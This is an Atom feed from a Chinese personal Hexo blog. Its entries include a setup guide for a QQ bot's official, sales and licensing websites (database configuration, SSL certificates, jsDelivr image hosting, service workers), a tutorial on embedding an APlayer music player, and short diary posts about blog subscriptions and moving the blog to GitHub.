<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hi, Lovely god</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://lovek.me/"/>
  <updated>2020-03-14T15:55:41.988Z</updated>
  <id>https://lovek.me/</id>
  
  <author>
    <name>Lovely God</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>签到萌宠机器人官网-官方文档(搭建介绍)</title>
    <link href="https://lovek.me/av12/"/>
    <id>https://lovek.me/av12/</id>
    <published>2020-03-06T07:54:26.000Z</published>
    <updated>2020-03-14T15:55:41.988Z</updated>
    
    <content type="html"><![CDATA[<h2 id="🍰在那里下载？"><a href="#🍰在那里下载？" class="headerlink" title="🍰在那里下载？"></a>🍰<span style="color:red">在那里下载？</span></h2><br><p>首先下载仓库到本地：</p><p>Git 下载：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/cheng2924070927/QQbot/</span><br></pre></td></tr></table></figure><a id="more"></a><p>Windwos浏览器下载：</p><img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.0/1.jpg" title="Hi，Lovely God"><br><ul>    <li><a href="https://github.com/cheng2924070927/QQbot" target="_blank">点击我使用浏览器下载</a></li></ul>(如果您是第一次打开GitHub仓库，可能访问比较慢，如果加载出来的页面很乱(即丢失css)请刷新页面重新加载)<br><br>得到以下文件：<img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.0/2.png" title="Hi，Lovely God"><hr><h2 id="🍰精美UI展示"><a href="#🍰精美UI展示" class="headerlink" title="🍰精美UI展示"></a>🍰<span style="color:red">精美UI展示</span></h2><br><div id="player"></div><script type="text/javascript" src="https://player.dogecloud.com/js/loader"></script><script type="text/javascript">var player = new DogePlayer({    container: document.getElementById('player'),    userId: 906,    vcode: '3b2293a910895d54',    autoPlay: false,    vtype: 10});</script><hr><h2 id="🍰怎么搭建出来？"><a href="#🍰怎么搭建出来？" class="headerlink" title="🍰怎么搭建出来？"></a>🍰<span style="color:red">怎么搭建出来？</span></h2><br>1.首先打开根目录中的<b>PZ</b>文件夹，如下图<img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.0/3.png" title="Hi，Lovely God"><br>2.文件夹内有两个PHP文件，先打开<b>GMSQ.php</b>文件，配置一下自己的数据库信息，最后保存退出<img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.0/4.png" title="Hi，Lovely God"><img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.0/5.png" title="Hi，Lovely God"><br>3.同上面一样，这次打开<b>SQZ.php</b>文件，再次配置自己的数据库信息，最后保存退出<img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.0/6.png" title="Hi，Lovely God"><img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.0/7.png" title="Hi，Lovely God"><br><ul><li>PS：GMSQ.php指定的数据库用来存放销售站数据，SQZ.php指定的数据库用来存放授权信息，有条件的可以分开配置两个数据库，这里就默认混合写在一个数据库中.<br></li></ul><p> 4.两个文件都写好后，先把<b>GMSQ.php</b>文件重命名为<b>config.php</b>，然后鼠标右键剪切下来，将它放到根目录下的<b>gmsq</b>文件夹内.</p><img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.0/8.jpg" title="Hi，Lovely God"><br> 5.弄完第4步后再返回之前的文件夹，再将<b>SQZ.php</b>文件重命名为<b>config.php</b>，然后和之前一样鼠标右键剪贴下来，将它放到根目录下的<b>sqz</b>文件夹内即可.  <img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.0/9.jpg" title="Hi，Lovely God"> <br> 6.此时已经算是配置好了，只差数据库了，打开根目录下的SJK文件夹，里面有一个名为<b>LKME.sql</b>的数据库文件，将它导入你的数据库.<br>（你如果分开用了两个数据库的话，先导入其中一个数据库，然后把shua开头的数据表再导出出来，然后再导入到另一个数据库内，shua开头的数据表都是销售站的数据库，注意两个连接数据库的文件别写反了）   <img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.0/10.png" title="Hi，Lovely God"> <br> 7.最后打包根目录内所有文件，上传到你的网站根目录  <img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.0/11.png" title="Hi，Lovely God"> <br><p> 8.在你的主机(服务器)控制面板找到错误页面自定义，输入：<b>http://你的域名/cuowu/</b>（如果您的域名是https协议请输入：<b>https://你的域名/cuowu/</b>）即可自定义错误页，一般配置404、403、500三个页面就足够了</p>  <img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.0/12.png" title="Hi，Lovely God"> <hr><h2 id="🍰查看效果"><a href="#🍰查看效果" class="headerlink" title="🍰查看效果"></a>🍰<span style="color:red">查看效果</span></h2><br><ul>    <li>浏览器输入你的域名，成功访问到官网首页，我们已经做了绿锁处理，但你的域名必须支持https协议才能生效</li></ul>  <img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.0/13.png" title="Hi，Lovely God"> <br><ul>    <li>点击授权查询成功到达授权站</li></ul>  <img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.0/14.png" title="Hi，Lovely God"> <br> <ul>    <li>点击立即购买成功到达销售站</li></ul>  <img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.0/15.png" title="Hi，Lovely God"> <hr><h2 id="🍰配置后台"><a href="#🍰配置后台" class="headerlink" title="🍰配置后台"></a>🍰<span style="color:red">配置后台</span></h2><br> <ul>    <li>销售站后台地址：<b>http://你的域名/gmsq/admin/</b><br>默认账号<b>admin</b>，密码<b>123456</b></li>    </ul>  <img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.0/16.png" title="Hi，Lovely God"><ul><!--     <li>销售站分站后台地址：<b>http://您配置的分站专属域名/gmsq/user</b>（需要配置两个域名）        <br>        <br> -->    <li>授权站后台地址：<b>http://你的域名/sqz/admin/</b><br>默认账号<b>admin</b>，密码<b>123456</b></li></ul>  <img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.0/17.png" title="Hi，Lovely God"><ul>    <li>授权站授权商后台地址：<b>http://你的域名/sqz/user/</b><br>默认没有授权商，在授权站后台建立授权商后授权商即可用此方式登录</li></ul><img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.0/18.png" title="Hi，Lovely God"><hr><h2 id="🍰授权站后台如何更改密码？"><a href="#🍰授权站后台如何更改密码？" class="headerlink" title="🍰授权站后台如何更改密码？"></a>🍰<span style="color:red">授权站后台如何更改密码？</span></h2><br>1.打开你的MySQL数据库管理页面，然后修改名为<b>auth_user</b>的数据表,<b>user</b>内输入用户名,<b>pass</b>内输入你的登录密码<img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.0/19.png" title="Hi，Lovely God"><br><ul><li>更改后，使用新的密码登录即可</li></ul><hr><h2 id="🍰修改官网为自己的信息"><a href="#🍰修改官网为自己的信息" class="headerlink" title="🍰修改官网为自己的信息"></a>🍰<span style="color:red">修改官网为自己的信息</span></h2><br><ul><li>您需要修改一些联系方式、跳转连接、官网名称、官网描述等信息</li></ul><p> 1.官网模板信息在网站根目录下的<b>index.html</b>文件内修改.</p><img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.0/20.png" title="Hi，Lovely God"><br><p>2.授权站模板信息在网站根目录下的<b>sqz/index.php</b>文件内修改.</p><img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.0/21.png" title="Hi，Lovely God"><br><p>3.销售站信息在网站根目录下的<b>gmsq/template/yunshang/index.php</b>文件内修改.<br>（销售站的大部分信息在后台即可更改，少量信息需要更改模板）</p><img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.0/22.png" title="Hi，Lovely God"><hr><h2 id="🍰搭建完成"><a href="#🍰搭建完成" class="headerlink" title="🍰搭建完成"></a>🍰<span style="color:red">搭建完成</span></h2><br>官网已经搭建好啦，销售站后台自己配置自己的信息，商品也为您添加好了，自己修改价格和描述，授权站怎样添加授权怎样添加代理商已经写在了授权站后台，自己去看.<hr><h2 id="🍰关于安全信息"><a href="#🍰关于安全信息" class="headerlink" title="🍰关于安全信息"></a>🍰<span style="color:red">关于安全信息</span></h2><br><ul><li><p>你有没有遇到过下面这种情况？域名被拦截问题？</p><img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.0/23.png" title="Hi，Lovely God"></li><li><p>想必各位都遇到过吧</p></li></ul><hr><h2 id="🍰如何解决安全问题？"><a href="#🍰如何解决安全问题？" class="headerlink" title="🍰如何解决安全问题？"></a>🍰<span style="color:red">如何解决安全问题？</span></h2><br><p>首先，您需要使用全站https协议，即超文本传输安全协议，是一种通过计算机网络进行安全通信的传输协议。使用该协议可防止黑客监听您的网站，各大浏览器对此证书都非常友好，<b>可有效防止您被列入危险网站</b>.</p><ul><li>那么问题来了，如何免费高效快速的配置稳定的https协议呢？请继续往下看</li></ul> <hr><h2 id="🍰申请支持https协议的SSL证书"><a href="#🍰申请支持https协议的SSL证书" class="headerlink" title="🍰申请支持https协议的SSL证书"></a>🍰<span style="color:red">申请支持https协议的SSL证书</span></h2><p><img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.0/24.png" title="Hi，Lovely God"><br><br><img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.0/25.png" title="Hi，Lovely God"><br><br></p><ul><li>在<a href="https://FreeSSL.cn/" target="_black">FreeSSL</a>网站上可免费快速生成SSL证书，有效期为一年，在此网站上申请证书填完信息只需要下载一个名为KeyManager的证书管理软件到您的电脑上，即可申请完成，省去了很多复杂的操作</li></ul><p> 3.证书申请回来之后如何安装到网站上？</p> <img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.0/26.png" title="Hi，Lovely God"><br><ul><li><p>找到您的SSL证书选项，如上图所示将您的<b>ssl证书内容</b>与<b>ssl证书key</b>填入您主机的SSL证书选项里面保存即可，有http跳转https功能的主机，请打开这个跳转功能，没有的忽略</p><ul><li>这时候可能有人就要问了，那我是用服务器搭建的怎么安装SSL证书呢？</li><li>不要着急，慢慢来，以<a href="https://bt.cn/" target="_black">宝塔面板</a>为例，首先导出你的SSL证书，服务器平台一般选择IIS即可.</li></ul></li></ul><img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.1/30.png" title="Hi，Lovely God"><br><ul><li>如下图所示，将您导出的证书导入到宝塔面板内，然后部署到您的域名就好了，建议开启强制HTTPS访问，这样别人访问不安全的http协议就会自动跳转到安全的https协议了</li></ul><img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.1/31.png" alt="图片未能正确加载，请尝试Ctrl+F5刷新本页" title="Hi，Lovely God"><br><ul><li><p>您的网站配置完SSL证书后，您打开<a href="https://myssl.com/ssl.html" target="_black">MySSL</a>输入您的域名检测一下SSL证书是否安装成功，使用https协议访问一下您的网站，看一下是否能够成功访问，如果成功访问到了也在MySSL上检测到了SSL证书的信息，那么就说明您的SSL证书安装成功了</p><ul><li>您也可以去看一下<a href="https://blog.freessl.cn/how-do-i-install-an-ssl-certificate-collection/" target="_black">FreeSSL的官方文档</a>，使用它们的一键部署功能</li></ul></li></ul><p><b><font style="color:red;font-size:150%;">注意！⇩</font></b></p><p><b>搭建经营性网站您必须要有SSL证书！必须要启用https协议加密安全访问，不然会被列入欺诈网站！！！</b></p><hr><h2 id="🍰怎么获得永久性的正版授权？"><a href="#🍰怎么获得永久性的正版授权？" class="headerlink" title="🍰怎么获得永久性的正版授权？"></a>🍰<span style="color:red">怎么获得永久性的正版授权？</span></h2><ul><li><p>本套网站您搭建出来后自带了三天的正版授权，您需要在三天内完成永久授权，放心，授权免费！<br>（主要防止篡改版权）</p></li><li><p>我写了一个非常简单的一键授权功能，只要鼠标点击一下不需要任何多余的操作即可获得永久授权，方便快捷</p><img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.1/32.png" title="Hi，Lovely God"></li><li><p>您搭建出来官网后，去您的销售站后台，找到更多选项中的最后一个选项，如上图所示，鼠标左键点击一下即可将您的域名写入我的服务器完成永久授权，您如果中途更换了域名的话，在更换域名后您需要重新点击一下那个授权选项，点击后即可再次完成永久授权，操作简单，1秒完事</p></li><li><p>您授权成功后，即可和正常使用本套官网，并且永不过期，因为授权后任何数据都不经过授权站，就算授权站没了您也可以正常使用不会被影响分毫，整站源码无任何加密，您有什么好的改良与优化，欢迎使用Git提交到我的GitHub仓库，通过审核后将发布新版本并且您也将成为这个项目的贡献者之一，让我们一起来维护这个开源项目吧！</p></li></ul><hr><h2 id="🍰快速加载图片资源，提升您网站的访问速度"><a href="#🍰快速加载图片资源，提升您网站的访问速度" class="headerlink" title="🍰快速加载图片资源，提升您网站的访问速度"></a>🍰<span style="color:red">快速加载图片资源，提升您网站的访问速度</span></h2><ul><li><p>您有没有遇到过这样的问题：</p><ul><li>网站内的图片加载很慢</li><li>因为要加载大量的图片资源，影响了网站的打开速度</li><li>网站上的图片一点一点的出现非常影响美观</li></ul></li></ul><p>您如果有上述的问题或是相似的问题，您可能第一时间想到的是使用CDN加速访问，但CDN是要用到人民币的，其实您还可以使用<a href="https://github.com/" target="_black">GitHub</a>+<a href="https://www.jsdelivr.com/" target="_black">jsDelivr</a>来加载网站内的图片，您现在所看到的这篇文章就是使用<a href="https://github.com/" target="_black">GitHub</a>+<a href="https://www.jsdelivr.com/" target="_black">jsDelivr</a>来加载图片的</p><img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.1/33.png" title="Hi，Lovely God"><ul><li><p>您现在可以试着反复刷新当前页面查看图片的加载速度如何，是不是惊奇的发现图片加载速度快的就像本地访问一样？基本看不到加载图片的过程！关于<a href="https://github.com/" target="_black">GitHub</a>和<a href="https://www.jsdelivr.com/" target="_black">jsDelivr</a>是什么，您可以<a href="https://www.baidu.com/" target="_black">百度</a>或<a href="https://www.google.com/" target="_black">Google</a>解决，那里不懂可以来问我，我会耐心解答哟！这个只要你了解GitHub就不是很难</p><ul><li>这里推荐几篇参考资料：<br><a href="https://www.cnblogs.com/yu-du-chen/p/10711748.html" target="_black">使用jsdelivr访问github资源</a><br><a href="https://www.jsdelivr.com/features" target="_black">jsDelivr官方文档</a><br><a href="https://mjx.js.org/2019/08/07/2-github-jsdelivr-cdn/" target="_black">用github+jsdelivr搭建免费的cdn</a></li></ul></li></ul> <hr><h2 id="🍰使用Service-worker实现离线访问您的网站"><a href="#🍰使用Service-worker实现离线访问您的网站" class="headerlink" title="🍰使用Service worker实现离线访问您的网站"></a>🍰<span style="color:red">使用Service worker实现离线访问您的网站</span></h2><ul><li><p>您的站点使用Service worker后，用户的浏览器访问您的站点就会自动缓存您的站点，只要您的用户访问过一次您的网站，就算它剪断网线、砸了家里的WIFI，它也还是能正常访问您的站点，也就是所谓的离线访问，断网后浏览器访问您的站点不会出现无网络的错误页面，就算没网络访问您的站点也会一切正常，并且您的站点有新内容后，用户连上网再次访问您的站点数据就会自动同步，用户在有网络的环境下访问您的网站，也只会请求您更新的新内容，其余没变的一切都在用户的浏览器内本地读取，这样不仅解决了用户的体验问题还可以大大的节省您服务器的资源消耗.</p></li><li><p>当然局限性也是有的：<br>只支持 HTTPS，因为可以截获用户的网络请求，需要在一个安全的环境。</p></li></ul><img src="https://cdn.jsdelivr.net/gh/LovelyGod/GitHub@v1.0.2/34.png" title="Hi，Lovely God"><ul><li><p>从上图中，我们可以看到 IE 和 Opera Mini 全面扑街，而主流浏览器中 Edge 17以下不支持，Safair 和 IOS Safair 刚刚开始支持，而火狐和 Chrome 支持良好。所以大家可以放心的使用，不过最好还是做一下判断，<a href="https://caniuse.com/#search=service%20worker" target="_black">点击查看兼容性报告</a></p></li><li><p>对于Service Worker，了解过Web Worker的可能会比较好理解，它和Web Worker相比，有相同的点，也有不同的地方，这里只是简略的说了一下，19年12月的时候我写过一篇关于Service worker的文章，如果想要了解更多的话您可以<a href="https://lovek.me/av6/" target="_black">访问我的另一篇文章</a></p></li><li><p>你是否想体验一下Service Worker离线访问呢？您现在可以剪断您的网线，尝试在无网络的环境下刷新这篇文章，或断网后直接复制本篇文章的域名重新访问此页，有没有发现其他的网页在无网络的环境下全都打不开了，然而本篇文章却依旧能够正常加载？这就是因为本篇文章使用了Service Worker来加载内容，您可以将Service Worker加入您自己的网站</p><blockquote>想要查看本篇文章的评论，想要评论本篇文章，您需要自备梯子，翻qiang后才能做到（即启用代理）</blockquote></li></ul> <br>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;🍰在那里下载？&quot;&gt;&lt;a href=&quot;#🍰在那里下载？&quot; class=&quot;headerlink&quot; title=&quot;🍰在那里下载？&quot;&gt;&lt;/a&gt;🍰&lt;span style=&quot;color:red&quot;&gt;在那里下载？&lt;/span&gt;&lt;/h2&gt;&lt;br&gt;

&lt;p&gt;首先下载仓库到本地：&lt;/p&gt;
&lt;p&gt;Git 下载：&lt;/p&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;git clone https://github.com/cheng2924070927/QQbot/&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="创作集" scheme="https://lovek.me/categories/%E5%88%9B%E4%BD%9C%E9%9B%86/"/>
    
    
  </entry>
  
  <entry>
    <title>添加APlayer音乐播放器</title>
    <link href="https://lovek.me/av11/"/>
    <id>https://lovek.me/av11/</id>
    <published>2020-02-14T09:38:39.000Z</published>
    <updated>2020-03-14T15:18:56.916Z</updated>
    
    <content type="html"><![CDATA[<ul><li>最近几天都呆在家里不能出门，属实很无聊，给某个机器人插件写了一个小HTML单页（命令表）</li><li>一切搞好后想添加一首背景音乐，突然觉得传统的后台播放不是很好，就想到了APlayer音乐播放器，但在HTML单页里添加实属麻烦，还要固定在浏览器左下角.</li><li>官方文档是这么写的：</li><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.6/a.png"><a id="more"></a><li>然而我..怎么加都加不进去...（膜拜那些大佬！）</li><li>在一次机缘巧合下我在腾讯云看到了这么一段代码：</li><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">&lt;!-- MetingJS start --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://cdn.jsdelivr.net/npm/aplayer@1.7.0/dist/APlayer.min.css"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"aplayer"</span> <span class="attr">data-id</span>=<span class="string">"2305794885"</span> <span class="attr">data-server</span>=<span class="string">"netease"</span> <span class="attr">data-type</span>=<span class="string">"playlist"</span> <span class="attr">data-fixed</span>=<span class="string">"true"</span> <span class="attr">data-autoplay</span>=<span class="string">"true"</span> <span class="attr">data-volume</span>=<span class="string">"1.0"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/aplayer@1.7.0/dist/APlayer.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/meting@1.1.0/dist/Meting.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- MetingJS end --&gt;</span></span><br></pre></td></tr></table></figure><li>试了一下，调用成功，但这不是我想要的效果</li><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.6/b.png"><li>通过自己的认知改进了一下代码：</li><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--引入css文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--引入js文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://cdn.jsdelivr.net/npm/meting@1.1.0/dist/Meting.min.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--引入js文件--&gt;</span></span><br></pre></td></tr></table></figure><li>以下代码放入body标签内</li><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"aplayer"</span> <span class="attr">data-id</span>=<span class="string">"571339817"</span> <span class="attr">data-server</span>=<span class="string">"netease"</span> <span class="attr">data-type</span>=<span class="string">"song"</span> <span class="attr">data-fixed</span>=<span class="string">"true"</span> <span class="attr">data-autoplay</span>=<span class="string">"true"</span> <span class="attr">data-volume</span>=<span class="string">"1.0"</span> <span class="attr">style</span>=<span class="string">"position: fixed;</span></span></span><br><span class="line"><span class="tag"><span class="string">bottom: 0;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><li>如何更改音乐：</li><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.6/c.jpg"><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data-id="音乐ID"</span><br><span class="line"><span class="comment">&lt;!-- 目前支持网易云音乐，进入网易云官网搜索一首好听的歌 --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 然后抬头看浏览器地址栏，链接最后面的一段数字就是音乐ID，复制到data-id中即可 --&gt;</span></span><br></pre></td></tr></table></figure><li>成功调用并固定到了网页底部</li><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.6/d.png"><li>APlayer音乐播放器真好看（不许反驳我哦！）</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;最近几天都呆在家里不能出门，属实很无聊，给某个机器人插件写了一个小HTML单页（命令表）&lt;/li&gt;
&lt;li&gt;一切搞好后想添加一首背景音乐，突然觉得传统的后台播放不是很好，就想到了APlayer音乐播放器，但在HTML单页里添加实属麻烦，还要固定在浏览器左下角.&lt;/li&gt;
&lt;li&gt;官方文档是这么写的：&lt;/li&gt;
&lt;img src=&quot;https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.6/a.png&quot;&gt;
    
    </summary>
    
    
      <category term="创作集" scheme="https://lovek.me/categories/%E5%88%9B%E4%BD%9C%E9%9B%86/"/>
    
    
  </entry>
  
  <entry>
    <title>现在可以订阅博客了！</title>
    <link href="https://lovek.me/av10/"/>
    <id>https://lovek.me/av10/</id>
    <published>2020-01-24T03:59:03.000Z</published>
    <updated>2020-01-26T09:45:38.370Z</updated>
    
    <content type="html"><![CDATA[<ul><li>博客已开通Email邮箱订阅功能，小可爱们现在可以随时捕捉到Lovely God的动态了！</li><li><a href="http://eepurl.com/gQlA05" target="_blank" rel="noopener">订阅 Hi, Lovely God</a>（推荐使用<a href="https://www.google.cn/intl/zh-CN/chrome/" target="_blank" rel="noopener">Chrome浏览器</a>订阅博客）</li></ul><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.5/dywj/dy/2.png"><a id="more"></a><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.5/dywj/dy/1.png"><img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.5/dywj/dy/3.png">]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;博客已开通Email邮箱订阅功能，小可爱们现在可以随时捕捉到Lovely God的动态了！&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://eepurl.com/gQlA05&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;订阅 Hi, Lovely God&lt;/a&gt;（推荐使用&lt;a href=&quot;https://www.google.cn/intl/zh-CN/chrome/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Chrome浏览器&lt;/a&gt;订阅博客）&lt;/li&gt;
&lt;/ul&gt;
&lt;img src=&quot;https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.5/dywj/dy/2.png&quot;&gt;
    
    </summary>
    
    
      <category term="日记本" scheme="https://lovek.me/categories/%E6%97%A5%E8%AE%B0%E6%9C%AC/"/>
    
    
  </entry>
  
  <entry>
    <title>博客搬家至GitHub,更换为Hexo框架</title>
    <link href="https://lovek.me/av9/"/>
    <id>https://lovek.me/av9/</id>
    <published>2020-01-22T16:27:20.000Z</published>
    <updated>2020-03-14T15:35:43.268Z</updated>
    
    <content type="html"><![CDATA[<ul>    <li>博客离开简洁的<a href="http://typecho.org/" target="_blank" rel="noopener">Typecho</a>花了5天时间，现在博客由<a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>强力驱动，这5天基本没怎么睡觉好累(つω｀)～</li>    <br>    <img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.4/dywj/bqhexo/1.png">    <a id="more"></a>    <br>    <li><a href="https://studio.dev.tencent.com/" target="_blank" rel="noopener">腾讯云开发者平台|cloud studio</a>1月21日下午3点20分突然进行升级操作令我丢了整个仓库的数据，最后折腾了一番，<a href="https://coding.net/products/cloudstudio" target="_blank" rel="noopener">新版CODING</a>界面不熟悉而且还很卡，上传、下载数据也慢的要死，Hexo还没下载完，突然提醒限制每天只能使用两小时...（气死我了！！！o(￣ヘ￣o＃)）</li>    <br>    <img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.4/dywj/bqhexo/2.png">    <br>    <li>最后只好改用本地环境搭建Hexo重新开始，心情不可描述...</li>    <li>博客离开了<a href="https://www.huaweicloud.com/" target="_blank" rel="noopener">华为云服务器</a>，转移至<a href="https://github.com" target="_blank" rel="noopener">GitHub</a>托管，感谢华为云这段时间的收留.（づ￣3￣）づ╭❤～</li>    <br>    <img src="https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.4/dywj/bqhexo/3.png">    <br>    <li>终于可以吧买服务器的钱省下来吃旋转小火锅啦~好激动~o(*≧▽≦)ツ┏━┓</li>    <li>马上要过年了哦，祝大家新年快乐</li>    <br>    <li>我想听手机收到压岁钱的提示音，有缘的小可爱现在可以<a href="https://cdn.jsdelivr.net/gh/cheng2924070927/Blog@v1.0.1/zswx.jpg" target="_blank" rel="noopener">向我转账</a>(*/ω＼*)害羞~</li>    <li><del>现在是晚上3点05分</del>，不，已经算是第二天早上3点了</li>    <br>    <li>坐在电脑面前冻得瑟瑟发抖的卑微Lovely God要去睡觉了，小可爱们晚安</li>    <li>对了，今后不要再喊我打游戏了，我是不会告诉你们我已经吧所有的游戏都<s>安装上了</s>卸载掉了(o゜▽゜)o☆</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
    &lt;li&gt;博客离开简洁的&lt;a href=&quot;http://typecho.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Typecho&lt;/a&gt;花了5天时间，现在博客由&lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;强力驱动，这5天基本没怎么睡觉好累(つω｀)～&lt;/li&gt;
    &lt;br&gt;
    &lt;img src=&quot;https://cdn.jsdelivr.net/gh/cheng2924070927/GitHub@v1.0.4/dywj/bqhexo/1.png&quot;&gt;
    
    </summary>
    
    
      <category term="日记本" scheme="https://lovek.me/categories/%E6%97%A5%E8%AE%B0%E6%9C%AC/"/>
    
    
  </entry>
  
  <entry>
    <title>100天成就达成！</title>
    <link href="https://lovek.me/av8/"/>
    <id>https://lovek.me/av8/</id>
    <published>2019-12-24T11:11:00.000Z</published>
    <updated>2020-01-22T15:45:05.590Z</updated>
    
